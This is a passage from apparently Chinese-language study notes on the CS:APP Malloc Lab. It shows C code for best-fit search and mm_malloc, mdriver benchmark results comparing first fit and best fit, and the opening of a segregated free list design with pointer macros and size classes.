<span class=normal><a href=#__codelineno-162-2> 2</a></span>
<span class=normal><a href=#__codelineno-162-3> 3</a></span>
<span class=normal><a href=#__codelineno-162-4> 4</a></span>
<span class=normal><a href=#__codelineno-162-5> 5</a></span>
<span class=normal><a href=#__codelineno-162-6> 6</a></span>
<span class=normal><a href=#__codelineno-162-7> 7</a></span>
<span class=normal><a href=#__codelineno-162-8> 8</a></span>
<span class=normal><a href=#__codelineno-162-9> 9</a></span>
<span class=normal><a href=#__codelineno-162-10>10</a></span>
<span class=normal><a href=#__codelineno-162-11>11</a></span>
<span class=normal><a href=#__codelineno-162-12>12</a></span>
<span class=normal><a href=#__codelineno-162-13>13</a></span>
<span class=normal><a href=#__codelineno-162-14>14</a></span>
<span class=normal><a href=#__codelineno-162-15>15</a></span>
<span class=normal><a href=#__codelineno-162-16>16</a></span>
<span class=normal><a href=#__codelineno-162-17>17</a></span>
<span class=normal><a href=#__codelineno-162-18>18</a></span>
<span class=normal><a href=#__codelineno-162-19>19</a></span>
<span class=normal><a href=#__codelineno-162-20>20</a></span>
<span class=normal><a href=#__codelineno-162-21>21</a></span>
<span class=normal><a href=#__codelineno-162-22>22</a></span>
<span class=normal><a href=#__codelineno-162-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-162-1><a id=__codelineno-162-1 name=__codelineno-162-1></a><span class=cm>/*</span>
</span><span id=__span-162-2><a id=__codelineno-162-2 name=__codelineno-162-2></a><span class=cm>* 最佳适配</span>
</span><span id=__span-162-3><a id=__codelineno-162-3 name=__codelineno-162-3></a><span class=cm>* @ asize: 请求分配的对齐后的内存大小</span>
</span><span id=__span-162-4><a id=__codelineno-162-4 name=__codelineno-162-4></a><span class=cm>* @ return: 指向分配块的有效载荷指针</span>
</span><span id=__span-162-5><a id=__codelineno-162-5 name=__codelineno-162-5></a><span class=cm>*/</span>
</span><span id=__span-162-6><a id=__codelineno-162-6 name=__codelineno-162-6></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>best_fit</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-162-7><a id=__codelineno-162-7 name=__codelineno-162-7></a><span class=p>{</span>
</span><span id=__span-162-8><a id=__codelineno-162-8 name=__codelineno-162-8></a><span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-162-9><a id=__codelineno-162-9 name=__codelineno-162-9></a><span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>best_bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-162-10><a id=__codelineno-162-10 name=__codelineno-162-10></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>min_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-162-11><a id=__codelineno-162-11 name=__codelineno-162-11></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>heap_list</span><span class=p>;</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span>
</span><span id=__span-162-12><a id=__codelineno-162-12 name=__codelineno-162-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-162-13><a id=__codelineno-162-13 name=__codelineno-162-13></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>asize</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))))</span>
</span><span id=__span-162-14><a id=__codelineno-162-14 name=__codelineno-162-14></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-162-15><a id=__codelineno-162-15 name=__codelineno-162-15></a><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>min_size</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>min_size</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>)))</span>
</span><span id=__span-162-16><a id=__codelineno-162-16 name=__codelineno-162-16></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-162-17><a id=__codelineno-162-17 name=__codelineno-162-17></a><span class=w>                </span><span class=n>min_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-162-18><a id=__codelineno-162-18 name=__codelineno-162-18></a><span class=w>                </span><span class=n>best_bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-162-19><a id=__codelineno-162-19 name=__codelineno-162-19></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-162-20><a id=__codelineno-162-20 name=__codelineno-162-20></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-162-21><a id=__codelineno-162-21 name=__codelineno-162-21></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-162-22><a id=__codelineno-162-22 name=__codelineno-162-22></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>best_bp</span><span class=p>;</span>
</span><span id=__span-162-23><a id=__codelineno-162-23 name=__codelineno-162-23></a><span class=p>}</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_19>分配块<a class=headerlink href=#_19 title="Permanent link">¶</a></h4> <p>最后就是主体部分 <code>mm_malloc</code> 函数，对申请的空间大小按 8 对齐进行舍入，然后根据放置策略查找有无合适的空闲块，如果没有则申请扩展堆:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-163-1> 1</a></span>
<span class=normal><a href=#__codelineno-163-2> 2</a></span>
<span class=normal><a href=#__codelineno-163-3> 3</a></span>
<span class=normal><a href=#__codelineno-163-4> 4</a></span>
<span class=normal><a href=#__codelineno-163-5> 5</a></span>
<span class=normal><a href=#__codelineno-163-6> 6</a></span>
<span class=normal><a href=#__codelineno-163-7> 7</a></span>
<span class=normal><a href=#__codelineno-163-8> 8</a></span>
<span class=normal><a href=#__codelineno-163-9> 9</a></span>
<span class=normal><a href=#__codelineno-163-10>10</a></span>
<span class=normal><a href=#__codelineno-163-11>11</a></span>
<span class=normal><a href=#__codelineno-163-12>12</a></span>
<span class=normal><a href=#__codelineno-163-13>13</a></span>
<span class=normal><a href=#__codelineno-163-14>14</a></span>
<span class=normal><a href=#__codelineno-163-15>15</a></span>
<span class=normal><a href=#__codelineno-163-16>16</a></span>
<span class=normal><a href=#__codelineno-163-17>17</a></span>
<span class=normal><a href=#__codelineno-163-18>18</a></span>
<span class=normal><a href=#__codelineno-163-19>19</a></span>
<span class=normal><a href=#__codelineno-163-20>20</a></span>
<span class=normal><a href=#__codelineno-163-21>21</a></span>
<span class=normal><a href=#__codelineno-163-22>22</a></span>
<span class=normal><a href=#__codelineno-163-23>23</a></span>
<span class=normal><a href=#__codelineno-163-24>24</a></span>
<span class=normal><a href=#__codelineno-163-25>25</a></span>
<span class=normal><a href=#__codelineno-163-26>26</a></span>
<span class=normal><a href=#__codelineno-163-27>27</a></span>
<span class=normal><a href=#__codelineno-163-28>28</a></span>
<span class=normal><a href=#__codelineno-163-29>29</a></span>
<span class=normal><a href=#__codelineno-163-30>30</a></span>
<span class=normal><a href=#__codelineno-163-31>31</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-163-1><a id=__codelineno-163-1 name=__codelineno-163-1></a><span class=cm>/* </span>
</span><span id=__span-163-2><a id=__codelineno-163-2 name=__codelineno-163-2></a><span class=cm>* mm_malloc - Allocate a block by incrementing the brk pointer.</span>
</span><span id=__span-163-3><a id=__codelineno-163-3 name=__codelineno-163-3></a><span class=cm>*     Always allocate a block whose size is a multiple of the alignment.</span>
</span><span id=__span-163-4><a id=__codelineno-163-4 name=__codelineno-163-4></a><span class=cm>*/</span>
</span><span id=__span-163-5><a id=__codelineno-163-5 name=__codelineno-163-5></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>mm_malloc</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=p>)</span>
</span><span id=__span-163-6><a id=__codelineno-163-6 name=__codelineno-163-6></a><span class=p>{</span>
</span><span id=__span-163-7><a id=__codelineno-163-7 name=__codelineno-163-7></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>;</span>
</span><span id=__span-163-8><a id=__codelineno-163-8 name=__codelineno-163-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>extendsize</span><span class=p>;</span>
</span><span id=__span-163-9><a id=__codelineno-163-9 name=__codelineno-163-9></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-163-10><a id=__codelineno-163-10 name=__codelineno-163-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-163-11><a id=__codelineno-163-11 name=__codelineno-163-11></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-163-12><a id=__codelineno-163-12 name=__codelineno-163-12></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>DSIZE</span><span class=p>)</span>
</span><span id=__span-163-13><a id=__codelineno-163-13 name=__codelineno-163-13></a><span class=w>        </span><span class=n>asize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>DSIZE</span><span class=p>;</span>
</span><span id=__span-163-14><a id=__codelineno-163-14 name=__codelineno-163-14></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-163-15><a id=__codelineno-163-15 name=__codelineno-163-15></a><span class=w>        </span><span class=n>asize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DSIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>((</span><span class=n>size</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>DSIZE</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>DSIZE</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>DSIZE</span><span class=p>);</span>
</span><span id=__span-163-16><a id=__codelineno-163-16 name=__codelineno-163-16></a><span class=w>    </span><span class=c1>// + (DSIZE): 为元数据（头部和脚部）预留空间</span>
</span><span id=__span-163-17><a id=__codelineno-163-17 name=__codelineno-163-17></a><span class=w>    </span><span class=c1>// + (DSIZE - 1): 实现向上取整到最近的DSIZE倍数</span>
</span><span id=__span-163-18><a id=__codelineno-163-18 name=__codelineno-163-18></a>
</span><span id=__span-163-19><a id=__codelineno-163-19 name=__codelineno-163-19></a><span class=w>    </span><span class=cm>/* 寻找合适的空闲块 */</span>
</span><span id=__span-163-20><a id=__codelineno-163-20 name=__codelineno-163-20></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>first_fit</span><span class=p>(</span><span class=n>asize</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-163-21><a id=__codelineno-163-21 name=__codelineno-163-21></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-163-22><a id=__codelineno-163-22 name=__codelineno-163-22></a><span class=w>        </span><span class=n>place</span><span class=p>(</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=n>asize</span><span class=p>);</span>
</span><span id=__span-163-23><a id=__codelineno-163-23 name=__codelineno-163-23></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-163-24><a id=__codelineno-163-24 name=__codelineno-163-24></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-163-25><a id=__codelineno-163-25 name=__codelineno-163-25></a><span class=w>    </span><span class=cm>/* 找不到则扩展堆 */</span>
</span><span id=__span-163-26><a id=__codelineno-163-26 name=__codelineno-163-26></a><span class=w>    </span><span class=n>extendsize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>MAX</span><span class=p>(</span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=n>CHUNKSIZE</span><span class=p>);</span>
</span><span id=__span-163-27><a id=__codelineno-163-27 name=__codelineno-163-27></a><span class=w>    </span><span class=k>if</span><span class=p>((</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>extend_heap</span><span class=p>(</span><span class=n>extendsize</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>WSIZE</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-163-28><a id=__codelineno-163-28 name=__codelineno-163-28></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-163-29><a id=__codelineno-163-29 name=__codelineno-163-29></a><span class=w>    </span><span class=n>place</span><span class=p>(</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=n>asize</span><span class=p>);</span>
</span><span id=__span-163-30><a id=__codelineno-163-30 name=__codelineno-163-30></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-163-31><a id=__codelineno-163-31 name=__codelineno-163-31></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_20>测试结果及分数<a class=headerlink href=#_20 title="Permanent link">¶</a></h4> <p>first fit: </p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-164-1> 1</a></span>
<span class=normal><a href=#__codelineno-164-2> 2</a></span>
<span class=normal><a href=#__codelineno-164-3> 3</a></span>
<span class=normal><a href=#__codelineno-164-4> 4</a></span>
<span class=normal><a href=#__codelineno-164-5> 5</a></span>
<span class=normal><a href=#__codelineno-164-6> 6</a></span>
<span class=normal><a href=#__codelineno-164-7> 7</a></span>
<span class=normal><a href=#__codelineno-164-8> 8</a></span>
<span class=normal><a href=#__codelineno-164-9> 9</a></span>
<span class=normal><a href=#__codelineno-164-10>10</a></span>
<span class=normal><a href=#__codelineno-164-11>11</a></span>
<span class=normal><a href=#__codelineno-164-12>12</a></span>
<span class=normal><a href=#__codelineno-164-13>13</a></span>
<span class=normal><a href=#__codelineno-164-14>14</a></span>
<span class=normal><a href=#__codelineno-164-15>15</a></span>
<span class=normal><a href=#__codelineno-164-16>16</a></span>
<span class=normal><a href=#__codelineno-164-17>17</a></span>
<span class=normal><a href=#__codelineno-164-18>18</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-164-1><a id=__codelineno-164-1 name=__codelineno-164-1></a><span class=m>08</span>-Malloc-Lab$<span class=w> </span>./mdriver<span class=w> </span>-t<span class=w> </span>./traces<span class=w> </span>-V
</span><span id=__span-164-2><a id=__codelineno-164-2 name=__codelineno-164-2></a>
</span><span id=__span-164-3><a id=__codelineno-164-3 name=__codelineno-164-3></a>Results<span class=w> </span><span class=k>for</span><span class=w> </span>mm<span class=w> </span>malloc:
</span><span id=__span-164-4><a id=__codelineno-164-4 name=__codelineno-164-4></a>trace<span class=w>  </span>valid<span class=w>  </span>util<span class=w>     </span>ops<span class=w>      </span>secs<span class=w>  </span>Kops
</span><span id=__span-164-5><a id=__codelineno-164-5 name=__codelineno-164-5></a><span class=m>0</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>5694</span><span class=w>  </span><span class=m>0</span>.005632<span class=w>  </span><span class=m>1011</span>
</span><span id=__span-164-6><a id=__codelineno-164-6 name=__codelineno-164-6></a><span class=m>1</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>5848</span><span class=w>  </span><span class=m>0</span>.005128<span class=w>  </span><span class=m>1140</span>
</span><span id=__span-164-7><a id=__codelineno-164-7 name=__codelineno-164-7></a><span class=m>2</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>6648</span><span class=w>  </span><span class=m>0</span>.008440<span class=w>   </span><span class=m>788</span>
</span><span id=__span-164-8><a id=__codelineno-164-8 name=__codelineno-164-8></a><span class=m>3</span><span class=w>       </span>yes<span class=w>  </span><span class=m>100</span>%<span class=w>    </span><span class=m>5380</span><span class=w>  </span><span class=m>0</span>.006519<span class=w>   </span><span class=m>825</span>
</span><span id=__span-164-9><a id=__codelineno-164-9 name=__codelineno-164-9></a><span class=m>4</span><span class=w>       </span>yes<span class=w>   </span><span class=m>66</span>%<span class=w>   </span><span class=m>14400</span><span class=w>  </span><span class=m>0</span>.000098147390
</span><span id=__span-164-10><a id=__codelineno-164-10 name=__codelineno-164-10></a><span class=m>5</span><span class=w>       </span>yes<span class=w>   </span><span class=m>92</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.005718<span class=w>   </span><span class=m>839</span>
</span><span id=__span-164-11><a id=__codelineno-164-11 name=__codelineno-164-11></a><span class=m>6</span><span class=w>       </span>yes<span class=w>   </span><span class=m>92</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.005450<span class=w>   </span><span class=m>881</span>
</span><span id=__span-164-12><a id=__codelineno-164-12 name=__codelineno-164-12></a><span class=m>7</span><span class=w>       </span>yes<span class=w>   </span><span class=m>55</span>%<span class=w>   </span><span class=m>12000</span><span class=w>  </span><span class=m>0</span>.072330<span class=w>   </span><span class=m>166</span>
</span><span id=__span-164-13><a id=__codelineno-164-13 name=__codelineno-164-13></a><span class=m>8</span><span class=w>       </span>yes<span class=w>   </span><span class=m>51</span>%<span class=w>   </span><span class=m>24000</span><span class=w>  </span><span class=m>0</span>.246358<span class=w>    </span><span class=m>97</span>
</span><span id=__span-164-14><a id=__codelineno-164-14 name=__codelineno-164-14></a><span class=m>9</span><span class=w>       </span>yes<span class=w>   </span><span class=m>27</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.038597<span class=w>   </span><span class=m>373</span>
</span><span id=__span-164-15><a id=__codelineno-164-15 name=__codelineno-164-15></a><span class=m>10</span><span class=w>      </span>yes<span class=w>   </span><span class=m>34</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.001546<span class=w>  </span><span class=m>9316</span>
</span><span id=__span-164-16><a id=__codelineno-164-16 name=__codelineno-164-16></a>Total<span class=w>         </span><span class=m>74</span>%<span class=w>  </span><span class=m>112372</span><span class=w>  </span><span class=m>0</span>.395814<span class=w>   </span><span class=m>284</span>
</span><span id=__span-164-17><a id=__codelineno-164-17 name=__codelineno-164-17></a>
</span><span id=__span-164-18><a id=__codelineno-164-18 name=__codelineno-164-18></a>Perf<span class=w> </span><span class=nv>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>44</span><span class=w> </span><span class=o>(</span>util<span class=o>)</span><span class=w> </span>+<span class=w> </span><span class=m>19</span><span class=w> </span><span class=o>(</span>thru<span class=o>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>63</span>/100
</span></code></pre></div></td></tr></table></div> <p>best fit:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-165-1> 1</a></span>
<span class=normal><a href=#__codelineno-165-2> 2</a></span>
<span class=normal><a href=#__codelineno-165-3> 3</a></span>
<span class=normal><a href=#__codelineno-165-4> 4</a></span>
<span class=normal><a href=#__codelineno-165-5> 5</a></span>
<span class=normal><a href=#__codelineno-165-6> 6</a></span>
<span class=normal><a href=#__codelineno-165-7> 7</a></span>
<span class=normal><a href=#__codelineno-165-8> 8</a></span>
<span class=normal><a href=#__codelineno-165-9> 9</a></span>
<span class=normal><a href=#__codelineno-165-10>10</a></span>
<span class=normal><a href=#__codelineno-165-11>11</a></span>
<span class=normal><a href=#__codelineno-165-12>12</a></span>
<span class=normal><a href=#__codelineno-165-13>13</a></span>
<span class=normal><a href=#__codelineno-165-14>14</a></span>
<span class=normal><a href=#__codelineno-165-15>15</a></span>
<span class=normal><a href=#__codelineno-165-16>16</a></span>
<span class=normal><a href=#__codelineno-165-17>17</a></span>
<span class=normal><a href=#__codelineno-165-18>18</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-165-1><a id=__codelineno-165-1 name=__codelineno-165-1></a><span class=m>08</span>-Malloc-Lab$<span class=w> </span>./mdriver<span class=w> </span>-t<span class=w> </span>./traces<span class=w> </span>-V
</span><span id=__span-165-2><a id=__codelineno-165-2 name=__codelineno-165-2></a>
</span><span id=__span-165-3><a id=__codelineno-165-3 name=__codelineno-165-3></a>Results<span class=w> </span><span class=k>for</span><span class=w> </span>mm<span class=w> </span>malloc:
</span><span id=__span-165-4><a id=__codelineno-165-4 name=__codelineno-165-4></a>trace<span class=w>  </span>valid<span class=w>  </span>util<span class=w>     </span>ops<span class=w>      </span>secs<span class=w>  </span>Kops
</span><span id=__span-165-5><a id=__codelineno-165-5 name=__codelineno-165-5></a><span class=m>0</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>5694</span><span class=w>  </span><span class=m>0</span>.006600<span class=w>   </span><span class=m>863</span>
</span><span id=__span-165-6><a id=__codelineno-165-6 name=__codelineno-165-6></a><span class=m>1</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>5848</span><span class=w>  </span><span class=m>0</span>.006014<span class=w>   </span><span class=m>972</span>
</span><span id=__span-165-7><a id=__codelineno-165-7 name=__codelineno-165-7></a><span class=m>2</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>6648</span><span class=w>  </span><span class=m>0</span>.009425<span class=w>   </span><span class=m>705</span>
</span><span id=__span-165-8><a id=__codelineno-165-8 name=__codelineno-165-8></a><span class=m>3</span><span class=w>       </span>yes<span class=w>  </span><span class=m>100</span>%<span class=w>    </span><span class=m>5380</span><span class=w>  </span><span class=m>0</span>.006891<span class=w>   </span><span class=m>781</span>
</span><span id=__span-165-9><a id=__codelineno-165-9 name=__codelineno-165-9></a><span class=m>4</span><span class=w>       </span>yes<span class=w>   </span><span class=m>66</span>%<span class=w>   </span><span class=m>14400</span><span class=w>  </span><span class=m>0</span>.000079181360
</span><span id=__span-165-10><a id=__codelineno-165-10 name=__codelineno-165-10></a><span class=m>5</span><span class=w>       </span>yes<span class=w>   </span><span class=m>96</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.012323<span class=w>   </span><span class=m>390</span>
</span><span id=__span-165-11><a id=__codelineno-165-11 name=__codelineno-165-11></a><span class=m>6</span><span class=w>       </span>yes<span class=w>   </span><span class=m>95</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.011813<span class=w>   </span><span class=m>406</span>
</span><span id=__span-165-12><a id=__codelineno-165-12 name=__codelineno-165-12></a><span class=m>7</span><span class=w>       </span>yes<span class=w>   </span><span class=m>55</span>%<span class=w>   </span><span class=m>12000</span><span class=w>  </span><span class=m>0</span>.073338<span class=w>   </span><span class=m>164</span>
</span><span id=__span-165-13><a id=__codelineno-165-13 name=__codelineno-165-13></a><span class=m>8</span><span class=w>       </span>yes<span class=w>   </span><span class=m>51</span>%<span class=w>   </span><span class=m>24000</span><span class=w>  </span><span class=m>0</span>.251622<span class=w>    </span><span class=m>95</span>
</span><span id=__span-165-14><a id=__codelineno-165-14 name=__codelineno-165-14></a><span class=m>9</span><span class=w>       </span>yes<span class=w>   </span><span class=m>31</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.039388<span class=w>   </span><span class=m>366</span>
</span><span id=__span-165-15><a id=__codelineno-165-15 name=__codelineno-165-15></a><span class=m>10</span><span class=w>       </span>yes<span class=w>   </span><span class=m>30</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.001692<span class=w>  </span><span class=m>8512</span>
</span><span id=__span-165-16><a id=__codelineno-165-16 name=__codelineno-165-16></a>Total<span class=w>          </span><span class=m>75</span>%<span class=w>  </span><span class=m>112372</span><span class=w>  </span><span class=m>0</span>.419184<span class=w>   </span><span class=m>268</span>
</span><span id=__span-165-17><a id=__codelineno-165-17 name=__codelineno-165-17></a>
</span><span id=__span-165-18><a id=__codelineno-165-18 name=__codelineno-165-18></a>Perf<span class=w> </span><span class=nv>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>45</span><span class=w> </span><span class=o>(</span>util<span class=o>)</span><span class=w> </span>+<span class=w> </span><span class=m>18</span><span class=w> </span><span class=o>(</span>thru<span class=o>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>63</span>/100
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=segregated-free-lists-segregated-fit>Segregated Free Lists实现 (Segregated Fit)<a class=headerlink href=#segregated-free-lists-segregated-fit title="Permanent link">¶</a></h3> </li> <li> <h4 id=_21>结构设置<a class=headerlink href=#_21 title="Permanent link">¶</a></h4> <p>空闲块设置如图结构：</p> <p><img alt="alt text" src=../../img/image-111.png width=360></p> <p>每一个块都有一个头部和脚部，在有效载荷中又分别存放着指向前一个块和后一个块的指针。所以每个空闲块最小为 16 个字节。</p> <p>堆的结构也是在原来的 Implict Free List 中进行略微改进，如图：</p> <p><img alt="alt text" src=../../img/image-112.png></p> <p>相当于在原来的堆结构中增加了两点：</p> <ul> <li>堆结构的前面放置不同等价类空闲块的头指针</li> <li>每个空闲块的有效载荷分出一部分作为前驱和后继指针</li> </ul> <p>也就是说，我们的这个做法与 Implicit Free List 非常相似，只不过多维护了 n 个链表</p> <p>根据链表的结构特点，增加了几个操作宏：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-166-1>1</a></span>
<span class=normal><a href=#__codelineno-166-2>2</a></span>
<span class=normal><a href=#__codelineno-166-3>3</a></span>
<span class=normal><a href=#__codelineno-166-4>4</a></span>
<span class=normal><a href=#__codelineno-166-5>5</a></span>
<span class=normal><a href=#__codelineno-166-6>6</a></span>
<span class=normal><a href=#__codelineno-166-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-166-1><a id=__codelineno-166-1 name=__codelineno-166-1></a><span class=cm>/* 读写指针p的位置 */</span>
</span><span id=__span-166-2><a id=__codelineno-166-2 name=__codelineno-166-2></a><span class=cp>#define GET(p) (*(unsigned int *)(p))</span>
</span><span id=__span-166-3><a id=__codelineno-166-3 name=__codelineno-166-3></a><span class=cm>/* 给定序号，找到链表头节点位置 */</span>
</span><span id=__span-166-4><a id=__codelineno-166-4 name=__codelineno-166-4></a><span class=cp>#define GET_HEAD(num) ((unsigned int *)(long)(GET(heap_list + WSIZE * num)))</span>
</span><span id=__span-166-5><a id=__codelineno-166-5 name=__codelineno-166-5></a><span class=cm>/* 给定bp，找到前驱和后继 */</span>
</span><span id=__span-166-6><a id=__codelineno-166-6 name=__codelineno-166-6></a><span class=cp>#define GET_PRE(bp) ((unsigned int *)(long)(GET(bp)))</span>
</span><span id=__span-166-7><a id=__codelineno-166-7 name=__codelineno-166-7></a><span class=cp>#define GET_SUC(bp) ((unsigned int *)(long)(GET((unsigned int *)bp + 1)))</span>
</span></code></pre></div></td></tr></table></div> <p>这里指针转换很繁杂，操作完后，一定要将其强制转换为<code>unsigned int *</code>，这样，返回的指针加 1 相当于加 32 个字节，便于定位块中其他部位。</p> </li> <li> <h4 id=_22>大小类设置<a class=headerlink href=#_22 title="Permanent link">¶</a></h4> <p>由上述结构，每个空闲块最小也要 16 个字节，理论上来说，设置的大小类越多，时间性能要越好，因而设置 20 个大小类：</p> <p><span class=arithmatex>\(\{ 16\}, \{ 17 \sim 32\}, \{ 33 \sim 64\},\cdots , \{ 2049 \sim 4096\}, \{ 4097 \sim 9194 \}, \cdots, \{ 2^{22}+1 \sim \infty \}\)</span></p> </li> <li> <h4 id=_23>结构建立<a class=headerlink href=#_23 title="Permanent link">¶</a></h4> <p>初始化函数：在序言块之前放置 20 个空闲链表头指针，剩下的结构与原来完全一样。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-167-1> 1</a></span>
